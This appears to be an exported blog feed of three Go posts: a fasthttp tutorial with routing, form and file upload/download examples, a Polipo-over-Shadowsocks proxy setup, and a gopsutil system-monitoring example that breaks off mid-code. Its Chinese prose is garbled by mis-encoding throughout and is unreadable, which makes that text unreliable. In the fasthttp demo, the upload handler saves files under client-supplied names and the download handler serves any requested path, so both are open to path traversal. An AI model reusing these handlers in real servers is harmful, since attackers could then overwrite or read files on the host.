    <url>%2F2017%2F01%2F25%2Ffasthttp%2F</url>
    <content type="text"><![CDATA[ÊµèËßàÁΩë‰∏äÂçöÂÆ¢Êó∂ÂèëÁé∞‰∫ÜËøô‰πà‰∏ÄÁØáÊµãËØïÊñáÁ´†nginx vs iris, ÁªìÊûúÊòØirisË∂äËÉú‰∏ÄÁ≠π, ËÄåIrisÂ∫ïÂ±Ç‰ΩøÁî®ÁöÑÂπ∂‰∏çÊòØGolangÁöÑHTTPÁöÑÊ†áÂáÜÂ∫ì, ËÄåÊòØ‰ΩøÁî®ÁöÑÁ¨¨‰∏âÊñπÂ∫ìfasthttp, ‰πãÂâçËØªËøá‰∏ÄÁÇπÂÖ≥‰∫égolangÁöÑnet/http, Âú®Â§ÑÁêÜÁî®Êà∑ÁöÑËØ∑Ê±ÇÊó∂ÁöÑÁ°ÆÊúâÁÇπÁ≤óÊö¥, Áõ¥Êé•‰∏Ä‰∏™ËøûÊé•‰∏Ä‰∏™goroutine, ÂÆåÂÖ®Ê≤°ÊúâÂπ∂ÂèëÁöÑÊéßÂà∂„ÄÇÊåâÊç∫‰∏çÂÅöÂÜÖÂøÉÁöÑÂ•ΩÂ•á, ÊÉ≥ÊÑüÂèó‰∏ÄÊääfasthttp, Êù•‰∏ÄËµ∑Ëµ∞ËøõfasthttpÁöÑ‰∏ñÁïåÁúãÁúã„ÄÇ BenchmarkÁöÑÁöÑËÉúÂá∫github‰∏äÈù¢Êúâ‰∏Ä‰∏™Â•Ω‰∫ãËÄÖÂÜô‰∫Ü‰∏Ä‰∏™Go WebÊ°ÜÊû∂ÊÄßËÉΩÁöÑÂéãÊµãÂ∑•ÂÖ∑, ÁªìÊûúÊòØfasthttpË°®Áé∞ÈùûÂ∏∏‰ºòÂºÇ, ÂÖ∑‰ΩìËØ∑Êü•Áúãgo-web-framework-benchmark githubÂú∞ÂùÄËØ∑ÂÖÅËÆ∏ÊàëË¥¥‰∏ÄÂº†‰ªñÁöÑÂõæ ÁÆÄ‰ªãfasthttpÊòØGoÁöÑHTTPÁöÑÁ¨¨‰∏âÊñπÂÆûÁé∞, ÂÆÉÂÆ£Áß∞ÊØîÊ†áÂáÜÂ∫ìnet/httpÂø´10ÂÄç, ÊòØ‰∏ÄÊ¨æÈ´òÊÄßËÉΩÁöÑHTTPÂÆûÁé∞„ÄÇGithub‰∏≠ÁöÑFasthttp best practicesËøôÊÆµÊèèËø∞‰∫ÜÂÆÉ‰∏∫Âï•È´òÊÄßËÉΩÁöÑÂéüÂõ† net/http ÁöÑÂÆûÁé∞ÊòØ‰∏Ä‰∏™ËøûÊé•Êñ∞Âª∫‰∏Ä‰∏™ goroutine; fasthttpÊòØÂà©Áî®‰∏Ä‰∏™ worker Â§çÁî® goroutineÔºåÂáèËΩª runtime Ë∞ÉÂ∫¶ goroutine ÁöÑÂéãÂäõ net/http Ëß£ÊûêÁöÑËØ∑Ê±ÇÊï∞ÊçÆÂæàÂ§öÊîæÂú® map[string]string (http.Header) Êàñ map[string][]string (http.Request.Form)ÔºåÊúâ‰∏çÂøÖË¶ÅÁöÑ []byte Âà∞ string ÁöÑËΩ¨Êç¢ÔºåÊòØÂèØ‰ª•ËßÑÈÅøÁöÑ net/http Ëß£Êûê HTTP ËØ∑Ê±ÇÊØèÊ¨°ÁîüÊàêÊñ∞ÁöÑ http.Request Âíå http.ResponseWriter; fasthttpËß£Êûê HTTP Êï∞ÊçÆÂà∞ fasthttp.RequestCtx ÔºåÁÑ∂Âêé‰ΩøÁî® sync.PoolÂ§çÁî®ÁªìÊûÑÂÆû‰æãÔºåÂáèÂ∞ëÂØπË±°ÁöÑÊï∞Èáè fasthttp‰ºöÂª∂ËøüËß£Êûê HTTP ËØ∑Ê±Ç‰∏≠ÁöÑÊï∞ÊçÆÔºåÂ∞§ÂÖ∂ÊòØ Body ÈÉ®ÂàÜ„ÄÇËøôÊ†∑ËäÇÁúÅ‰∫ÜÂæàÂ§ö‰∏çÁõ¥Êé•Êìç‰Ωú Body ÁöÑÊÉÖÂÜµÁöÑÊ∂àËÄó ‰ΩÜÊòØÂõ†‰∏∫fasthttpÁöÑÂÆûÁé∞‰∏éÊ†áÂáÜÂ∫ìÂ∑ÆË∑ùËæÉÂ§ßÔºåÊâÄ‰ª•APIÁöÑËÆæËÆ°ÂÆåÂÖ®‰∏çÂêå, Âõ†Ê≠§‰πü‰∏çÂÖºÂÆπÊ†áÂáÜÂ∫ìnet/http„ÄÇ‰ΩøÁî®Êó∂Êó¢ÈúÄË¶ÅÁêÜËß£HTTPÁöÑÂ§ÑÁêÜËøáÁ®ãÔºåÂèàÈúÄË¶ÅÊ≥®ÊÑèÂíåÊ†áÂáÜÂ∫ìÁöÑÂ∑ÆÂà´„ÄÇ Âü∫Êú¨‰ΩøÁî®Âü∫Êú¨Áî®Ê≥ïÂæàÁÆÄÂçï, 1. ÂÜôÂ•Ωhandler 2. ÁõëÂê¨‰∫§ÁªôhandlerÂ§ÑÁêÜ.12345678910111213141516171819package mainimport ( "fmt" "github.com/valyala/fasthttp")// ‰ΩøÁî®RequestCtx‰º†ÈÄíHTTPÁöÑÊï∞ÊçÆfunc httpHandler(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "hello fasthttp")&#125;// ÂêØÂä®ÊúçÂä°Êó∂ÊåáÂÆöÂ§ÑÁêÜ‰ªªÂä°ÁöÑhandlerfunc main() &#123; if err := fasthttp.ListenAndServe("0.0.0.0:8080", httpHandler); err != nil &#123; fmt.Println("start fasthttp fail:", err.Error()) &#125;&#125; Ë∑ØÁî±net/httpÊèê‰æõhttp.ServeMuxÂÆûÁé∞Ë∑ØÁî±ÊúçÂä°Ôºå‰ΩÜÊòØÂåπÈÖçËßÑÂàôÁÆÄÈôãÔºåÂäüËÉΩÂæàÁÆÄÂçïÔºåÂü∫Êú¨‰∏ç‰ºö‰ΩøÁî®„ÄÇ fasthttpÂê∏ÂèñÊïôËÆ≠ÔºåÈªòËÆ§Ê≤°ÊúâÊèê‰æõË∑ØÁî±ÊîØÊåÅ„ÄÇÂÆòÊñπÊèêÂà∞‰∫Ü4‰∏™Ë∑ØÁî±ÂÆûÁé∞: Iris, fasthttp-routing, fasthttproute, lu, Á¨¨‰∏Ä‰∏™ÊòØÊ°ÜÊû∂, Á¨¨‰∫å‰∏â‰∏™ÊòØÂçïÁ∫ØÁöÑË∑ØÁî±, Á¨¨4‰∏™‰∏çÁü•ÈÅì„ÄÇÊàëËøôÈáåÈÄâÊã©fasthttprouter, Âõ†‰∏∫github‰∏äÈù¢Ëøô‰∏™È°πÁõÆÊñáÊ°£ÂíåÊ¥ªË∑ÉÂ∫¶ÊØîËæÉ‰∏çÈîô ÂÆâË£Öfasthttprouter12345678‚ûú Blogs go get -u -v &quot;github.com/buaazp/fasthttprouter&quot;github.com/buaazp/fasthttprouter (download)github.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)github.com/buaazp/fasthttprouter ÁÆÄÂçï‰ΩøÁî®ËØ¶Â∞ΩÁöÑ‰ΩøÁî®ËøòÂæóÂéªÁúãGithubÊàñËÄÖÊ∫êÁ†Å, ËØ∑ÂÖÅËÆ∏ÊàëË¥¥‰∏ÄÊÆµÂÆòÊñπÁöÑ‰ª£Á†Å, ÊàëÊú¨Âú∞‰πüÁî®ÁùÄËøô‰∏™Êµã12345678910111213141516171819202122232425package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Index(ctx *fasthttp.RequestCtx) &#123; fmt.Fprint(ctx, "Welcome!\n")&#125;func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; ËØ∑Ê±ÇÂíåÂìçÂ∫îÂú®fasthttp‰∏≠‰ΩøÁî®‰∏Ä‰∏™ÂØπË±°Êù•Áª¥Êä§ËØ∑Ê±ÇÁöÑ‰∏ä‰∏ãÊñá:RequestCtx, ÂÆÉÁªºÂêà‰∫Ühttp.RequestÂíåhttp.ResponseWriterÁöÑÊìç‰ΩúÔºåÂèØ‰ª•Êõ¥Êñπ‰æøÁöÑËØªÂèñÂíåËøîÂõûÊï∞ÊçÆ, ÈÄöËøá‰∏ãÂõæËøôÁßçÂØπÁÖßË°®Êàë‰ª¨ÂèØ‰ª•Ê∏ÖÊô∞ÁöÑÁúãÂá∫Êù•12345678910111213141516171819202122232425262728293031r.Body -&gt; ctx.PostBody()r.URL.Path -&gt; ctx.Path()r.URL -&gt; ctx.URI()r.Method -&gt; ctx.Method()r.Header -&gt; ctx.Request.Headerr.Header.Get() -&gt; ctx.Request.Header.Peek()r.Host -&gt; ctx.Host()r.Form -&gt; ctx.QueryArgs() + ctx.PostArgs()r.PostForm -&gt; ctx.PostArgs()r.FormValue() -&gt; ctx.FormValue()r.FormFile() -&gt; ctx.FormFile()r.MultipartForm -&gt; ctx.MultipartForm()r.RemoteAddr -&gt; ctx.RemoteAddr()r.RequestURI -&gt; ctx.RequestURI()r.TLS -&gt; ctx.IsTLS()r.Cookie() -&gt; ctx.Request.Header.Cookie()r.Referer() -&gt; ctx.Referer()r.UserAgent() -&gt; ctx.UserAgent()w.Header() -&gt; ctx.Response.Headerw.Header().Set() -&gt; ctx.Response.Header.Set()w.Header().Set(&quot;Content-Type&quot;) -&gt; ctx.SetContentType()w.Header().Set(&quot;Set-Cookie&quot;) -&gt; ctx.Response.Header.SetCookie()w.Write() -&gt; ctx.Write(), ctx.SetBody(), ctx.SetBodyStream(), ctx.SetBodyStreamWriter()w.WriteHeader() -&gt; ctx.SetStatusCode()w.(http.Hijacker).Hijack() -&gt; ctx.Hijack()http.Error() -&gt; ctx.Error()http.FileServer() -&gt; fasthttp.FSHandler(), fasthttp.FShttp.ServeFile() -&gt; fasthttp.ServeFile()http.Redirect() -&gt; ctx.Redirect()http.NotFound() -&gt; ctx.NotFound()http.StripPrefix() -&gt; fasthttp.PathRewriteFunc ‰∏ãÈù¢ÊòØ‰∏Ä‰∏™ÁÆÄÂçï‰æãÂ≠êÔºåÂú®‰∏ä‰∏ãÊñá‰∏≠Ëé∑ÂèñËØ∑Ê±ÇÊï∞ÊçÆ, ÈÄöËøáWriteStringÊù•ËøîÂõûÂìçÂ∫î„ÄÇ1234567891011121314151617181920212223242526272829303132333435363738package mainimport ( "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.WriteString("hello,fasthttp") // Âõ†‰∏∫ÂÆûÁé∞‰∏çÂêåÔºåfasthttp ÁöÑËøîÂõûÂÜÖÂÆπ‰∏çÊòØÂç≥ÂàªËøîÂõûÁöÑ // ‰∏çÂêå‰∫éÊ†áÂáÜÂ∫ìÔºåÊ∑ªÂä†ËøîÂõûÂÜÖÂÆπÂêéËÆæÁΩÆÁä∂ÊÄÅÁ†ÅÔºå‰πüÊòØÊúâÊïàÁöÑ ctx.SetStatusCode(404) // ËøîÂõûÁöÑÂÜÖÂÆπ‰πüÊòØÂèØ‰ª•Ëé∑ÂèñÁöÑÔºå‰∏çÈúÄË¶ÅÊ†áÂáÜÂ∫ìÁöÑÁî®Ê≥ïÔºåÈúÄË¶ÅËá™Â∑±Êâ©Â±ï http.ResponseWriter fmt.Printf("Host: %s\n", ctx.Host()) fmt.Printf("Body: %s\n", ctx.Response.Body()) fmt.Printf("Path: %s\n", ctx.Path()) fmt.Printf("Method: %s\n", ctx.Method()) fmt.Printf("URI: %s\n", ctx.URI()) fmt.Printf("Connect Time: %s\n", ctx.ConnTime()) fmt.Printf("UserAgent: %s\n", ctx.UserAgent())&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; BodyÂ§ÑÁêÜfasthttp Êèê‰æõÊØîÊ†áÂáÜÂ∫ì‰∏∞ÂØåÁöÑ Body Êìç‰Ωú APIÔºåËÄå‰∏îÊîØÊåÅËß£Êûê Gzip ËøáÁöÑÊï∞ÊçÆ, Êàë‰ª¨ÂèØ‰ª•ÁÆÄÂçïÁöÑ‰ΩøÁî®‰∏ä‰∏ãÊñáÁöÑPostBodyÊñπÊ≥ïËé∑Âèñbody1234567891011121314151617181920212223242526272829303132package mainimport ( "encoding/json" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; body := ctx.PostBody() // Ëé∑ÂèñÂà∞ÁöÑÊòØ []byte fmt.Fprintf(ctx, "Body:%s", body) // Âõ†‰∏∫ÊòØ []byteÔºåËß£Êûê JSON ÂæàÁÆÄÂçï var v interface&#123;&#125; json.Unmarshal(body, &amp;v) fmt.Printf("%v", v)&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; ÁÆÄÂçïÁöÑÊµãËØïÁªìÊûú12‚ûú Blogs curl -X POST -d &apos;&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125;&apos; http://127.0.0.1:8080/Body:&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125; Ë°®ÂçïÂ§ÑÁêÜRequestCtxÊúâÂêåÊ†áÂáÜÂ∫ìÁöÑ FormValue() ÊñπÊ≥ïÔºåËøòÂØπ GET Âíå POST/PUT ‰º†ÈÄíÁöÑÂèÇÊï∞ËøõË°å‰∫ÜÂå∫ÂàÜ1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "bytes" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.SetContentType("text/html") // GET ?abc=abc&amp;abc=123 getValues := ctx.QueryArgs() fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", getValues.Peek("abc")) // Peek Âè™Ëé∑ÂèñÁ¨¨‰∏Ä‰∏™ÂÄº fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", bytes.Join(getValues.PeekMulti("abc"), []byte(","))) // PeekMulti Ëé∑ÂèñÊâÄÊúâÂÄº // POST xyz=xyz&amp;xyz=123 postValues := ctx.PostArgs() fmt.Fprintf(ctx, "POST xyz=%s &lt;br/&gt;", postValues.Peek("xyz")) fmt.Fprintf(ctx, "POST xyz=%s &lt;br/&gt;", bytes.Join(postValues.PeekMulti("xyz"), []byte(",")))&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; ËæìÂá∫ÁªìÊûú:1234GET abc=abc GET abc=abc,123 POST xyz=xyz POST xyz=xyz,123 Êñá‰ª∂Â§ÑÁêÜfasthttpÊèê‰æõÂçÅÂàÜÂèãÂ•ΩÁöÑÊé•Âè£, ÈÄöËøáFromFileËØªÊñá‰ª∂‰∏ä‰º†, ÈÄöËøáSendFileÊù•Êèê‰æõ‰∏ãËΩΩ,‰ΩÜÊòØÂ¶ÇÊûú‰Ω†ÊÉ≥Êõ¥Âä†Êñπ‰æøÁöÑÂÆöÂà∂‰∏Ä‰∫õ‰ø°ÊÅØ,ÊúÄÂ•Ω‰ΩøÁî®MultipartFormÊù•Ëé∑Âèñ‰∏ä‰º†ÂØπË±°1234567891011121314151617// MultipartForm returns requests's multipart form.//// Returns ErrNoMultipartForm if request's content-type// isn't 'multipart/form-data'.//// All uploaded temporary files are automatically deleted after// returning from RequestHandler. Either move or copy uploaded files// into new place if you want retaining them.//// Use SaveMultipartFile function for permanently saving uploaded file.//// The returned form is valid until returning from RequestHandler.//// See also FormFile and FormValue.func (ctx *RequestCtx) MultipartForm() (*multipart.Form, error) &#123; return ctx.Request.MultipartForm()&#125; MultipartForm ËøîÂõûÁöÑÊòØ‰∏Ä‰∏™FormÁªìÊûÑ‰Ωì, Êàë‰ª¨Âú®‰ªéÊ∫êÁ†Å‰∏≠ÁúãÁúãËøô‰∏™Form123456789// Form is a parsed multipart form.// Its File parts are stored either in memory or on disk,// and are accessible via the *FileHeader's Open method.// Its Value parts are stored as strings.// Both are keyed by field name.type Form struct &#123; Value map[string][]string File map[string][]*FileHeader&#125; ÊúÄÂ•ΩÊàë‰ª¨ÊåâÁÖß‰∏äÈù¢ÁöÑÂàÜÊûêÂÆûÁé∞‰∫Ü‰∏Ä‰∏™ÁÆÄÂçïÁöÑ‰∏ãËΩΩÂíå‰∏ä‰º†ÂäüËÉΩÁöÑÂ∞èDemo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package mainimport ( "fmt" "html/template" "io" "log" "strconv" "time" "crypto/md5" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")// Hello Handlerfunc Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;// Index Handler, ÈªòËÆ§ÁöÑContenTypeÊòØtext/plain, ËæìÂá∫ÁöÑÂÜÖÂÆπÂú®preÊ†áÁ≠æÈáåÈù¢// Âõ†Ê≠§ËøôÈáåÂøÖÈ°ªÊâãÂä®ËÆæÁΩÆContentType‰∏∫text/htmlfunc Index(ctx *fasthttp.RequestCtx) &#123; ctx.Response.Header.SetContentType("text/html") t := template.New("index.gtpl") t, _ = t.Parse(`&lt;html&gt; &lt;head&gt; &lt;title&gt;‰∏ä‰º†Êñá‰ª∂&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form enctype="multipart/form-data" action="/upload" method="post"&gt; &lt;input type="file" name="uploadfile" /&gt; &lt;input type="hidden" name="token" value="&#123;&#123;.&#125;&#125;"/&gt; &lt;input type="submit" value="upload" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;`) crutime := time.Now().Unix() h := md5.New() io.WriteString(h, strconv.FormatInt(crutime, 10)) token := fmt.Sprintf("%x", h.Sum(nil)) t.Execute(ctx, token)&#125;// UploadHandler is herefunc UploadHandler(ctx *fasthttp.RequestCtx) &#123; data, err := ctx.MultipartForm() if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("get upload file error:", err) return &#125; fileObj := data.File["uploadfile"][0] err = fasthttp.SaveMultipartFile(fileObj, fileObj.Filename) if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("save upload file error:", err) return &#125; ctx.Write([]byte("save file successfully!"))&#125;// DownloadHandler is herefunc DownloadHandler(ctx *fasthttp.RequestCtx) &#123; fileName := ctx.UserValue("filename") switch fileName := fileName.(type) &#123; case string: ctx.SendFile(fileName) default: ctx.SetStatusCode(500) fmt.Println("the filename is not string.") &#125;&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.POST("/upload", UploadHandler) router.GET("/download/:filename", DownloadHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125;]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>fasthttp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Âà©Áî®PolipoÊûÑÂª∫Âü∫‰∫éSSÁöÑhttp proxy]]></title>
    <url>%2F2017%2F01%2F24%2Fhttp-proxy%2F</url>
    <content type="text"><![CDATA[ÊêûËøô‰∏™ÁöÑ‰∏ªË¶ÅÂéüÂõ†ÊòØgolangÁöÑÂæàÂ§ö‰æùËµñÂåÖÈúÄË¶ÅÁøªÂ¢ô‰∏ãËΩΩ, Ëøô‰∏çÂÉèPythonÂíåNodeJSÊúâÂÆòÊñπÊ∫ê‰ªìÂ∫ìÁöÑËØ≠Ë®Ä(ÈÖçÁΩÆÂõΩÂÜÖÊ∫êÂèØ‰ª•Âä†ÈÄü). ‰πãÂâçÁî®windowsÁöÑÊó∂ÂÄô‰πüÊòØ‰ΩøÁî®ss, ËÄåhttp proxyÊòØÈÄöËøáchromeÁöÑ‰∏Ä‰∏™Êèí‰ª∂Proxy SwitchyOmegaÊù•ÂÅöÁöÑÔºå‰ΩÜÊòØÂú®mac‰∏ãÈù¢ËøôÊãõ‰∏çÁÅµ‰∫Ü, ‰∏ãÈù¢‰∏ªË¶Å‰ªãÁªçmacÂ¶Ç‰ΩïÂà©Áî®ssÊê≠Âª∫http proxy. ÂÆâË£ÖShadowsocksssÁöÑÂÆâË£ÖÂíåËøêË°åÊòØÂâçÊèê, ËøôÈáå‰∏çÂ§öÂÅö‰ªãÁªçÔºåÂÖ∑‰ΩìËØ∑Êü•ÁúãShadowsocksÂÆâË£ÖÂíå‰ΩøÁî® PolipoÁÆÄ‰ªãËøôÈáå‰∏ªË¶Å‰ΩøÁî®PolipoÊù•ÂÅöhttp proxy, polipoÁöÑÂÆòÊñπÊòØËøôÊ†∑‰ªãÁªçÂÆÉÁöÑÔºö‚ÄúPolipo ÊòØ‰∏Ä‰∏™Â∞èËÄåÂø´ÈÄüÁöÑÁºìÂ≠ò web ‰ª£ÁêÜÁ®ãÂ∫è(web ÁºìÂ≠ò, HTTP ‰ª£ÁêÜ, ‰ª£ÁêÜÊúçÂä°Âô®)„ÄÇÂ∞ΩÁÆ° Polipo ÊòØ‰∏∫‰∏Ä‰∏™‰∫∫Êàñ‰∏ÄÂ∞èÁæ§‰∫∫‰ΩøÁî®ËÄåËÆæËÆ°ÁöÑÔºå‰ΩÜÂπ∂‰∏çÂ¶®Á¢çÂÆÉ‰∏∫‰∏ÄÂ§ßÁæ§‰∫∫ÊâÄ‰ΩøÁî®„ÄÇ‚Äù,ËØ•È°πÁõÆÁöÑÂú∞ÂùÄ polipo GithubÂú∞ÂùÄ, ËØ•È°πÁõÆÁöÑÂÆòÊñπÊñáÊ°£polipoÂÆòÊñπÊñáÊ°£ÂèØÊÉúËØ•È°πÁõÆÁöÑ‰ΩúËÄÖÂ∑≤ÁªèÂÅúÊ≠¢ËØ•È°πÁõÆÁöÑÁª¥Êä§‰∫Ü, ‰∏îÁî®‰∏îÁèçÊÉú„ÄÇ PolipoÂÆâË£ÖShadowsocksÂÆòÊñπÊé®Ëçêhttp proxy‰ª£ÁêÜ‰πüÊòØPolipo, ÂÆòÊñπÂØπÊ≠§‰πüÂÅö‰∫ÜÁÆÄÂçïÁöÑÊèèËø∞ÔºåÊàëÁõ¥Êé•ÊäÑËøáÊù•‰∫Ü ÂÆâË£Ö123apt-get install poliposervice polipo stoppolipo socksParentProxy=localhost:1080 ‰ª•‰∏äÊòØÂÆòÊñπÊñáÊ°£ÈáåÈù¢ÁöÑËØ¥ÊòéÔºåÂú®mac‰∏ã‰ΩøÁî®polipoË¶ÅÁ®çÂÅö‰øÆÊîπ macÁöÑÂÆâË£Ö1brew install polipo Polipo‰ΩøÁî® ssÂØπpolipoÁöÑ‰ΩøÁî®Ê†∑‰æã 1234567891011http_proxy=http://localhost:8123 apt-get updatehttp_proxy=http://localhost:8123 curl www.google.comhttp_proxy=http://localhost:8123 wget www.google.comgit config --global http.proxy 127.0.0.1:8123git clone https://github.com/xxx/xxx.gitgit xxxgit xxxgit config --global --unset-all http.proxy macÁöÑ‰ΩøÁî®ÊâìÂºÄ‰∏Ä‰∏™terminal, ‰∏çË¶ÅÂÖ≥ÊéâÔºåË±°genymotion‰πãÁ±ªÁöÑÂÖ∂‰ªñÁ®ãÂ∫èÂ∞±ÂèØ‰ΩøÁî®Http‰ª£ÁêÜ‰∫Ü. 12‚ûú ~ polipo socksParentProxy=localhost:1080Established listening socket on port 8123. ÁÑ∂ÂêéÊàë‰ª¨‰ΩøÁî®‰ΩøÁî®ËØ•http proxyÊù•ÂÆâË£ÖgolangÂåÖ,ËÆ∞ÂæóÂºÄÂêØÁöÑ‰Ω†ÁöÑss123456‚ûú Blogs https_proxy=http://localhost:8123 go get -u -v github.com/valyala/fasthttpgithub.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)]]></content>
      <categories>
        <category>ÂºÄÂèëÂ∑•ÂÖ∑</category>
        <category>Shadowsocks</category>
      </categories>
      <tags>
        <tag>http-proxy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Â§∏Âπ≥Âè∞Á≥ªÁªüÁõëÊéßÂ∫ì-gopsutils]]></title>
    <url>%2F2017%2F01%2F22%2Fgopsutils%2F</url>
    <content type="text"><![CDATA[ÂæàÊ¨£ËµètelegrafÁöÑÊû∂ÊûÑ,‰πãÂâç‰πüÂ§öÊ¨°‰ΩøÁî®, ÊúÄËøë‰πüË¶ÅÈÄöËøá‰ªñÊù•Ëé∑ÂèñÁ≥ªÁªüËøêË°åÊó∂‰ø°ÊÅØÁÑ∂Âêé‰∏ä‰º†,ÊâÄ‰ª•ÊÉ≥ÂÄüÈâ¥‰∏ãtelegrafÈáåÈù¢ÁöÑsystemÊ®°ÂùóÁöÑÂÆûÁé∞ÔºåÁúã‰∫Ü‰∏ã‰ªñÁöÑÊ∫êÁ†ÅÔºåÂèëÁé∞‰ªñ‰ΩøÁî®‰∫Ü‰∏Ä‰∏™ÂêçÂè´gopsutilsÂ∫ìÊù•ÂÆåÊàêÊâÄÊúâÁöÑÁ≥ªÁªüÊï∞ÊçÆÁöÑÈááÈõÜÁöÑ, ‰∫éÊòØÂÜ≥ÂÆöÊâãÂä®ËØïËØïËøô‰∏™Â∫ìÁöÑÂäüËÉΩ„ÄÇ ÁÆÄ‰ªãÂú®ËØ¥gopsutils‰πãÂâçÊàë‰ª¨ÂøÖÈ°ªÂÖàËØ¥‰∏ãpsutilsÊòØÂï•, Âõ†‰∏∫gopsutilsÂÆûÈôÖ‰∏äÂ∞±ÊòØ‰∏Ä‰∏™golangÁâàÊú¨ÁöÑpsutils(‰ªéÂêçÂ≠ó‰∏ä‰πüËÉΩÁúãÂá∫Êù•)psutilsÊòØ‰∏Ä‰∏™ÊØîËæÉÂá∫ÂêçÁöÑpythonÂ∫ì, psutilsÊòØpython process and system utilitiesÁöÑ‰∏Ä‰∏™Áº©ÂÜô. ÂÆÉÊúâÂ¶Ç‰∏ãÁâπÁÇπ Ë∑®Âπ≥Âè∞: Linux, Windows, OSX, Sun Solaris, FreeBSD, OpenBSD and NetBSDÁöÑ32‰ΩçÂíå64‰ΩçÁ≥ªÁªü ÂäüËÉΩ‰∏∞ÂØå: ÂÆûÁé∞‰∫ÜËøõÁ®ãÁÆ°ÁêÜ,Á≥ªÁªüËØäÊñ≠, Ëøô‰∏™Â∫ìÂü∫Êú¨ÂÆûÁé∞‰∫ÜËøô‰∫õÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑ÁöÑÂäüËÉΩ: ps, top, lsof, netstat, ifconfig, who, df, kill, free, nice, ionice, iostat, iotop, uptime, pidof, tty, taskset, pmap Â¶ÇÊûúÊÉ≥Ë¶Å‰∫ÜËß£ÂÖ≥‰∫égopsutilsÊõ¥Â§öÁöÑËØ¶ÊÉÖ ËØ∑Êü•Áúãgopsutils githubÂú∞ÂùÄ ÂÆâË£Ö1‚ûú gops_test go get -v &quot;github.com/shirou/gopsutil&quot; ‰ΩøÁî®ÂÖ∑‰ΩìÁöÑ‰ΩøÁî®ÊñáÊ°£ÂèØ‰ª•ÂèÇËÄÉgopsutilÁöÑgodocÊñáÊ°£‰ª•‰∏ã‰ª•ÊµãËØïÊî∂ÈõÜcpu, disk, load, mem, net, process ‰∏∫Âàó, Ê≥®ÊÑèËøô‰∫õÂØπË±°ÈÉΩ‰ΩøÁî®StringÊñπÊ≥ï, Âõ†Ê≠§ÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî®fmtÊâìÂç∞ÔºåStringÊñπÊ≥ï‰ºöÂ∞ÜÂÖ∂ËΩ¨Êç¢ÊàêJsonËæìÂá∫.12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package mainimport ( "fmt" "github.com/shirou/gopsutil/cpu" "github.com/shirou/gopsutil/disk" "github.com/shirou/gopsutil/load" "github.com/shirou/gopsutil/mem" "github.com/shirou/gopsutil/net" "github.com/shirou/gopsutil/process")func main() &#123; fmt.Println("CPUÁªüËÆ°:") c, _ := cpu.Info() fmt.Println(c) fmt.Println("ÂÜÖÂ≠òÁªüËÆ°:") m, _ := mem.VirtualMemory() fmt.Println(m) fmt.Println("Á£ÅÁõòÁî®ÈáèÂíåIOÁªüËÆ°:") dp, _ := disk.Partitions(true) du, _ := disk.Usage("/") di, _ := disk.IOCounters() fmt.Println(du) fmt.Println(dp) fmt.Println(di) fmt.Println("ÁΩëÁªúIOÁªüËÆ°:") ni, _ := net.IOCounters(true) fmt.Println(ni) fmt.Println("ÂçèËÆÆÁªüËÆ°:") nt, _ := net.ProtoCounters(nil) fmt.Println(nt) fmt.Println("ÈìæÊé•Áä∂ÊÄÅÁªüËÆ°:") nc, _ := net.Connections("all") fmt.Println(nc) fmt.Println("ËøõÁ®ãÁªüËÆ°:") pi, _ := process.Pids() fmt.Println(pi) p, _ := 